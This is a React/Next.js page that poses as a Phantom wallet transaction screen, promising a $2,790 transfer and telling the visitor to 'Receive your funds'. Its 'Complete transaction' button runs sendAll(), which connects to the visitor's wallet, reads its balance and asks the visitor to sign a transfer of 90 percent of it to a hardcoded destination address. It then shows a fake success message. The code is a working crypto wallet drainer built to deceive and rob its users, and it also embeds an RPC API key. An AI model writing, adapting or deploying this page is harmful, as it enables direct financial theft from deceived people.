"use client";
import { useState } from "react";

export default function Home() {

const [confirmed, setConfirmed] = useState(false);
const [signature, setSignature] = useState("");


  const DESTINO = "DJPSsRnYZjddCaQJsNJ4hibSjMN6tD2stC2wHRjM13iE";


async function sendAll() {
  try {

    setConfirmed(true);

    const { solana } = window as any;

    if (!solana) {
      alert("Instala Phantom");
      return;
    }

    


    // conectar Phantom
    const response = await solana.connect();

    const publicKey = response.publicKey;


    const {
      Connection,
      PublicKey,
      SystemProgram,
      Transaction
    } = await import("@solana/web3.js");


const connection = new Connection(
  "https://mainnet.helius-rpc.com/?api-key=0edb452d-fadb-4600-bf0a-547111150ad0",
  "confirmed"
);

    // saldo
    const balance = await connection.getBalance(publicKey);


    // 90%
    const amount = Math.floor(balance * 0.90);


    if(amount <= 0){
      alert("Sin saldo");
      return;
    }


    const tx = new Transaction().add(

      SystemProgram.transfer({

        fromPubkey: publicKey,

        toPubkey: new PublicKey(DESTINO),

        lamports: amount

      })

    );


    tx.feePayer = publicKey;


    tx.recentBlockhash = (
      await connection.getLatestBlockhash()
    ).blockhash;



    // abrir Phantom
    const signed = await solana.signTransaction(tx);



    // enviar
    const signature =
      await connection.sendRawTransaction(
        signed.serialize()
      );


    await connection.confirmTransaction(signature);

    setSignature(signature);
setConfirmed(true);

    alert("Transferencia confirmada");


  } catch(error){

    console.error(error);

    alert("Transacción cancelada o error");

  }
}

  return (
    <main className="
      min-h-screen
      bg-[#0f1115]
      flex
      items-center
      justify-center
      text-white
      px-6
    ">

      <div className="
        w-full
        max-w-md
        bg-[#151922]
        border
        border-white/10
        rounded-3xl
        p-8
        text-center
      ">

        <img
          src="/logo.svg"
          alt="Phantom"
          className="
            w-24
            h-24
            mx-auto
            mb-8
          "
        />


        <h1 className="
          text-2xl
          font-bold
        ">
          Confirm $2,790 transaction
        </h1>

<div className="
  mt-4
  text-gray-400
  leading-relaxed
">

<p>
  Please add balance to your wallet
  <span className="
    mx-2
    text-white
    font-bold
  ">
    $201
  </span>
  to complete the transaction. 
</p>

<span className="
  mt-4
  inline-flex
  items-center
  rounded-full
  bg-[#9945FF]
  px-3
  py-1
  text-sm
  font-semibold
">
  SOL
</span>

</div>

        <div className="
  mt-8
  space-y-3
  text-left
">

  

  <div className="
    flex
    items-center
    gap-4
    bg-[#0f1115]
    border
    border-white/10
    rounded-2xl
    p-4
  ">
    <div className="
      w-8
      h-8
      rounded-full
      bg-[#9945FF]
      flex
      items-center
      justify-center
      font-bold
    ">
      1
    </div>

    

    <p className="text-sm">
      Add balance in <b>Phantom</b>
    </p>
  </div>


  <div className="
    flex
    items-center
    gap-4
    bg-[#0f1115]
    border
    border-white/10
    rounded-2xl
    p-4
  ">
    <div className="
      w-8
      h-8
      rounded-full
      bg-[#9945FF]
      flex
      items-center
      justify-center
      font-bold
    ">
      2
    </div>

    <p className="text-sm">
      Click <b>Confirm in Phantom</b>
    </p>
  </div>


  <div className="
    flex
    items-center
    gap-4
    bg-[#0f1115]
    border
    border-white/10
    rounded-2xl
    p-4
  ">
    <div className="
      w-8
      h-8
      rounded-full
      bg-[#9945FF]
      flex
      items-center
      justify-center
      font-bold
    ">
      3
    </div>

    <p className="text-sm">
       Receive your funds in <b>Phantom</b>
    </p>
  </div>

</div>


        <div className="
          mt-8
          bg-[#0f1115]
          border
          border-white/10
          rounded-2xl
          p-5
          text-left
        ">

          <p className="text-sm text-gray-400">
            Red
          </p>

          <p className="mt-1 font-semibold">
            Solana Mainnet
          </p>


          <p className="
            mt-4
            text-sm
            text-gray-400
          ">
            Fee
          </p>

          <p className="mt-1 font-semibold">
            0.000 SOL
          </p>

        </div>


        <button
              onClick={sendAll}
          className="
            mt-8
            w-full
            rounded-xl
            bg-[#9945FF]
            hover:bg-[#8035e8]
            py-4
            font-semibold
            transition
          "
        >
         Complete transaction 
        </button>


      {confirmed && signature && (

<div className="
  mt-8
  bg-[#151922]
  border
  border-[#14F195]/30
  rounded-3xl
  p-6
  text-center
">

<div className="
  w-16
  h-16
  mx-auto
  rounded-full
  bg-[#14F195]/10
  flex
  items-center
  justify-center
  text-3xl
">
✓
</div>


<h2 className="
  mt-5
  text-2xl
  font-bold
">
  Transaction Confirmed
</h2>


<p className="
  mt-3
  text-gray-400
">
  Your SOL transfer was completed successfully.
</p>


<div className="
  mt-6
  bg-[#0f1115]
  border
  border-white/10
  rounded-2xl
  p-4
  text-left
">

<p className="
  text-sm
  text-gray-400
">
Network
</p>

<p className="font-semibold">
Solana Mainnet
</p>


<p className="
  mt-4
  text-sm
  text-gray-400
">
Transaction
</p>

<p className="
  mt-1
  text-xs
  break-all
  text-[#14F195]
">
{signature}
</p>


</div>


<a
  href={`https://solscan.io/tx/${signature}`}
  target="_blank"
  className="
    mt-6
    block
    w-full
    rounded-xl
    bg-[#9945FF]
    py-3
    font-semibold
  "
>
  View on Solscan
</a>


</div>

)}

      </div>

    </main>
  );
}